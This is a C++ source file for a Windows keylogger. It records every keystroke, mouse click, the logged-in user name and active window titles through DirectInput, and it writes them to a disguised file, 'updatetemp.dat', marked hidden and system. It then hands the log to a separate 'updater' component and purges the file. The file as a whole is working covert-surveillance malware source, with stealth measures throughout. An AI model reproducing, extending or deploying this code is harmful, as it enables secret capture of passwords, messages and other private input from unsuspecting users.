#include "keylogger.h"

#include "main.h"

int StartKeyLoggerCore(void *_myKeyLogger)
{
	DebugLog("Keylogger thread start...");

	KeyLogger *myKeyLogger = (KeyLogger*)_myKeyLogger;

	return myKeyLogger->KeyLoggerCore();
}

int KeyLogger::Shutdown()
{
	DebugLog("Shutting down keylogger...");

	shuttingDown = true;

	WaitForSingleObject(keyLoggerThread, INFINITE);

	int retVal; GetExitCodeThread(keyLoggerThread, (LPDWORD)&retVal);

	return retVal;
}

int KeyLogger::KeyLoggerCore()
{
	// used for timing

	unsigned int ticks           = 0;
	unsigned int lastFlushTicks  = 0;

	// used for storing our data log

	string tempPath = myInstaller.GetInstallPath() + "\\updatetemp.dat";

	FILE *tempFile = fopen(tempPath.c_str(), "a+b");

	// failure to store means we should probably just exit

	if (!tempFile)
	{
		DebugLog("Error writing keylogger temp file.");

		if (!PostThreadMessage(mainThreadID, WM_QUIT, NULL, NULL))
		{
			DebugLog("Unable to send shutdown message to main thread.");
		}

		return 1;
	}

	// we SHOULD start at the end of the file in a+b mode but hey, I don't fcking trust C libs

	fseek(tempFile, 0, SEEK_END);

	// if possible it'd be nice if this file was hidden as well

	if (!SetFileAttributesA(tempPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM))
	{
		DebugLog("Warning: Unable to set hidden and system attributes on keylogger temp file.");
	}

	// write a user logon event to our data

	unsigned char userLogonSignal = LOGGER_EVENT_LOGON;
	fwrite(&userLogonSignal, 1, 1, tempFile);

	string userName     = getenv("UserName");

	unsigned char null = 0;

	fwrite(userName.c_str(), 1, userName.length(), tempFile); fwrite(&null, 1, 1, tempFile);

	// used for tracking current window title changes

	string currentWindowTitle = "";

	// directinput data buffers

	DIDEVICEOBJECTDATA keys[KEY_BUFFER_SIZE];
	DIDEVICEOBJECTDATA mouseData[MOUSE_BUFFER_SIZE];

	unsigned char keyBuffer[KEY_BUFFER_SIZE * 2]     = {0};
	unsigned char mouseBuffer[MOUSE_BUFFER_SIZE * 2] = {0};

	// core loop

	while (true)
	{
		// read our raw key data into an intermediate buffer

		DWORD numElements = KEY_BUFFER_SIZE;

		HRESULT readResult = keyboard->GetDeviceData(sizeof(DIDEVICEOBJECTDATA), keys, &numElements, 0);

		// something bad happened while trying to read key data, just bail out

		if ((readResult != DI_OK) && (readResult != DI_BUFFEROVERFLOW))
		{
			DebugLog("Warning: Error reading keyboard data.");

			if (keyboard->Acquire() != DI_OK)
			{
				DebugLog("Error re-aquiring keyboard object after keyboard error.");
			}

			numElements = 0;
		}

		unsigned int buffPos = 0;

		for (unsigned int i = 0; i < (unsigned int)numElements; i++)
		{
			unsigned char scanCode = unsigned char(keys[i].dwOfs);

			if (keys[i].dwData & 0x80) // key on
			{
				if ((scanCode > 0) && (scanCode < 252)) // we use 0 and 252-255 for other events
				{
					keyBuffer[buffPos++] = scanCode;
				}
			}
			else // key off
			{
				// we only care about key off events for certain keys (shift, alt, control)

				if ((scanCode == 42) || (scanCode == 54) || (scanCode == 29) || (scanCode == 157) || (scanCode == 56) || (scanCode == 184))
				{
					keyBuffer[buffPos++] = LOGGER_EVENT_KEYUP;
					keyBuffer[buffPos++] = scanCode;
				}
			}
		}

		// get mouse input if we grabbed one

		unsigned int mouseBuffPos = 0;

		if (mouse != NULL)
		{
			numElements = MOUSE_BUFFER_SIZE;

			HRESULT readResult = mouse->GetDeviceData(sizeof(DIDEVICEOBJECTDATA), mouseData, &numElements, 0);

			// something bad happened while trying to read key data, just bail out

			if ((readResult != DI_OK) && (readResult != DI_BUFFEROVERFLOW))
			{
				DebugLog("Warning: Error reading mouse data.");

				if (mouse->Acquire() != DI_OK)
				{
					DebugLog("Warning: Re-aquiring mouse object failed after mouse error.");
				}
			}

			for (unsigned int i = 0; i < (unsigned int)numElements; i++)
			{
				DWORD mouseAction = mouseData[i].dwOfs;

				if (mouseData[i].dwData & 0x80)	// button down
				{
					if (mouseAction == DIMOFS_BUTTON0) mouseBuffer[mouseBuffPos++] = LOGGER_EVENT_MOUSE1;
					if (mouseAction == DIMOFS_BUTTON1) mouseBuffer[mouseBuffPos++] = LOGGER_EVENT_MOUSE2;
				}
			}
		}

		// if any keys were pressed in the interval

		if (buffPos || mouseBuffPos)
		{
			// check if the current window title has changed, if it has
			// we write out the new title in our data with a 0 event

			HWND foregroundWindow = GetForegroundWindow();
			
			char _foregroundWindowTitle[256] = {0};
			GetWindowText(foregroundWindow, _foregroundWindowTitle, 255);

			string foregroundWindowTitle = string(_foregroundWindowTitle);
			
			// and write the new keyboard data as well

			fwrite(keyBuffer, 1, buffPos, tempFile);

			// if any mouse events occured write them as well

			fwrite(mouseBuffer, 1, mouseBuffPos, tempFile);

			if (foregroundWindowTitle != currentWindowTitle)
			{
				currentWindowTitle = foregroundWindowTitle;

				char newWindowSignal = LOGGER_EVENT_WINDOW;	// 0 in the data stream means window title change

				fwrite(&newWindowSignal, 1, 1, tempFile);
				fwrite(currentWindowTitle.c_str(), 1, currentWindowTitle.length(), tempFile); fwrite(&null, 1, 1, tempFile);
			}
		}

		// flush our data to disk at least once per 30 seconds to prevent data loss

		if (((ticks - lastFlushTicks) > (FLUSH_INTERVAL * 10)) || shuttingDown)
		{
			DebugLog("Flushing data...");

			fflush(tempFile);

			lastFlushTicks = ticks;

			if (shuttingDown)
			{
				return 0;
			}
		}

		if (dataRequested)
		{
			DebugLog("Data requested from keylogger...");

			dataRequested = false;

			dataSize = ftell(tempFile);

			if (dataSize)
			{
				fseek(tempFile, 0, SEEK_SET);
	
				data = new unsigned char[dataSize];
				fread(data, 1, dataSize, tempFile);
	
				fseek(tempFile, dataSize, SEEK_SET);
	
				fflush(tempFile);
	
				lastFlushTicks = ticks;
			}

			DebugLog("Data (%i bytes) ready...", dataSize);

			SetEvent(dataReady);
		}

		if (dataCompleted)
		{
			DebugLog("Data completed use by updater...");

			dataCompleted = false;

			if (dataSize) delete [] data;

			if (dataError)
			{
				dataError = false;

				DebugLog("No log data purged due to error.");
			}
			else
			{
				long int newDataSize = ftell(tempFile);

				long int sizeDiff = newDataSize - dataSize;

				if (sizeDiff)
				{
					data = new unsigned char[sizeDiff];
		
					fseek(tempFile, dataSize, SEEK_SET);
					fread(data, 1, sizeDiff, tempFile);
				}

				fseek(tempFile, 0, SEEK_SET);
				_chsize(tempFile->_file, 0);

				if (sizeDiff)
				{
					fwrite(data, 1, sizeDiff, tempFile);

					delete [] data;
				}

				fflush(tempFile);

				lastFlushTicks = ticks;

				DebugLog("Purged %i bytes with %i bytes remaining.", dataSize, sizeDiff);
			}
		}

		ticks++;

		Sleep(100); // 10th of a second
	}

	return 1;
}

int KeyLogger::StartKeyLogger()
{
	// keylogger / directinput init

    if (DirectInput8Create(GetModuleHandle(NULL), DIRECTINPUT_VERSION, IID_IDirectInput8, (VOID**)&directInput, NULL) != DI_OK)
	{
		DebugLog("Error creating DirectInput8 object.");
		return 0;
	}

	if (directInput->CreateDevice(GUID_SysKeyboard, &keyboard, NULL) != DI_OK)
	{
		DebugLog("Error creating keyboard object.");
		return 0;
	}

	if (keyboard->SetDataFormat(&c_dfDIKeyboard) != DI_OK)
	{
		DebugLog("Error setting data format.");
		return 0;
	}

	if (keyboard->SetCooperativeLevel(hWnd, DISCL_BACKGROUND | DISCL_NONEXCLUSIVE) != DI_OK)
	{
		DebugLog("Error setting cooperative level.");
		return 0;
	}

	// not getting the mouse isn't critical, but hey it would be nice

	if (directInput->CreateDevice(GUID_SysMouse, &mouse, NULL) != DI_OK)
	{
		DebugLog("Warning: Could not create mouse object.");
		mouse = NULL;
	}
	else
	{
		if (mouse->SetDataFormat(&c_dfDIMouse) != DI_OK)
		{
			DebugLog("Warning: Could not set mouse data format.");
			mouse = NULL;
		}
		else
		{
			if (mouse->SetCooperativeLevel(hWnd, DISCL_BACKGROUND | DISCL_NONEXCLUSIVE) != DI_OK)
			{
				DebugLog("Warning: Could not set mouse cooperative level.");
				mouse = NULL;
			}
		}
	}

    DIPROPDWORD dipdw;

    dipdw.diph.dwSize       = sizeof(DIPROPDWORD);
    dipdw.diph.dwHeaderSize = sizeof(DIPROPHEADER);
    dipdw.diph.dwObj        = 0;
    dipdw.diph.dwHow        = DIPH_DEVICE;
    dipdw.dwData            = KEY_BUFFER_SIZE;

    if (keyboard->SetProperty(DIPROP_BUFFERSIZE, &dipdw.diph) != DI_OK)
	{
		DebugLog("Error setting keyboard buffer size.");
		return 0;
	}

	if (keyboard->Acquire() != DI_OK)
	{
		DebugLog("Error acquiring keyboard object.");
		return 0;
	}

    dipdw.dwData = MOUSE_BUFFER_SIZE;

	if (mouse != NULL)
	{
		if (mouse->SetProperty(DIPROP_BUFFERSIZE, &dipdw.diph) != DI_OK)
		{
			DebugLog("Warning: Could not set mouse buffer size.");
			mouse = NULL;
		}
		else
		{
			if (mouse->Acquire() != DI_OK)
			{
				DebugLog("Warning: Could not acquire mouse object.");
				mouse = NULL;
			}
		}
	}

	keyLoggerThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&StartKeyLoggerCore, (void*)this, 0, NULL);

	if (!keyLoggerThread)
	{
		DebugLog("Error creating keylogger thread.");
		return 0;
	}

	shuttingDown = false;

	dataRequested = false;
	dataCompleted = false;
	dataError     = false;

	dataReady = CreateEvent(NULL, false, false, NULL);

	if (!dataReady)
	{
		DebugLog("Error creating dataReady sync object.");
		return 0;
	}

	return 1;
}